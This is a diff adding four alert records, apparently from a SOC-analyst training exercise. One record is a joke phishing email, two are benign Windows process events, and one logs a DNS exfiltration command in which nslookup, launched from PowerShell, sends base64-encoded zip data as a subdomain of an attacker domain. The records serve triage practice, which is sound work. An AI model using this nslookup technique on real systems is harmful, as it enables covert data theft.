@@ -1,0 +1,154 @@
+Alert 1
+
+{
+  "attachment": [
+    "None"
+  ],
+  "content": [
+    " A long lost billionaire relative has left you their secret hat empire To claim your inheritance send us your banking details immediately"
+  ],
+  "datasource": [
+    "email"
+  ],
+  "direction": [
+    "inbound"
+  ],
+  "recipient": [
+    "support@tryhatme.com"
+  ],
+  "sender": [
+    "eileen@trendymillineryco.me"
+  ],
+  "subject": [
+    "Inheritance Alert: Unknown Billionaire Relative Left You Their Hat Fortunes"
+  ],
+  "timestamp": [
+    "2026-09-24T16:23:58.148Z"
+  ],
+  "_id": "koIH1KAB7beoVb-iZZmN",
+  "_index": "logs",
+  "_score": null
+}
+
+Alert 2
+
+{
+  "datasource": [
+    "sysmon"
+  ],
+  "event.action": [
+    "Process Create (rule: ProcessCreate)"
+  ],
+  "event.code": [
+    "1"
+  ],
+  "host.name": [
+    "win-3459"
+  ],
+  "process.command_line": [
+    "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ],
+  "process.name": [
+    "TrustedInstaller.exe"
+  ],
+  "process.parent.name": [
+    "services.exe"
+  ],
+  "process.parent.pid": [
+    "3506"
+  ],
+  "process.pid": [
+    "3577"
+  ],
+  "process.working_directory": [
+    "C:\\Windows\\system32\\"
+  ],
+  "timestamp": [
+    "2026-09-24T16:26:22.148Z"
+  ],
+  "_id": "nYIH1KAB7beoVb-iZ5kM",
+  "_index": "logs",
+  "_score": null
+}
+
+Alert 3
+
+{
+  "datasource": [
+    "sysmon"
+  ],
+  "event.action": [
+    "Process Create (rule: ProcessCreate)"
+  ],
+  "event.code": [
+    "1"
+  ],
+  "host.name": [
+    "win-3451"
+  ],
+  "process.command_line": [
+    "taskhostw.exe KEYROAMING"
+  ],
+  "process.name": [
+    "taskhostw.exe"
+  ],
+  "process.parent.name": [
+    "svchost.exe"
+  ],
+  "process.parent.pid": [
+    "3653"
+  ],
+  "process.pid": [
+    "3585"
+  ],
+  "process.working_directory": [
+    "C:\\Windows\\system32\\"
+  ],
+  "timestamp": [
+    "2026-09-24T16:28:46.148Z"
+  ],
+  "_id": "qoII1KAB7beoVb-iu5mK",
+  "_index": "logs",
+  "_score": null
+}
+
+Alert 4
+
+{
+  "datasource": [
+    "sysmon"
+  ],
+  "event.action": [
+    "Process Create (rule: ProcessCreate)"
+  ],
+  "event.code": [
+    "1"
+  ],
+  "host.name": [
+    "win-3450"
+  ],
+  "process.command_line": [
+    "\"C:\\Windows\\system32\\nslookup.exe\" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io"
+  ],
+  "process.name": [
+    "nslookup.exe"
+  ],
+  "process.parent.name": [
+    "powershell.exe"
+  ],
+  "process.parent.pid": [
+    "3728"
+  ],
+  "process.pid": [
+    "5520"
+  ],
+  "process.working_directory": [
+    "C:\\Users\\michael.ascot\\downloads\\exfiltration\\"
+  ],
+  "timestamp": [
+    "2026-09-24T17:02:41.535Z"
+  ],
+  "_id": "6RRL1KABDhOwCOng9M2r",
+  "_index": "logs",
+  "_score": null
+}
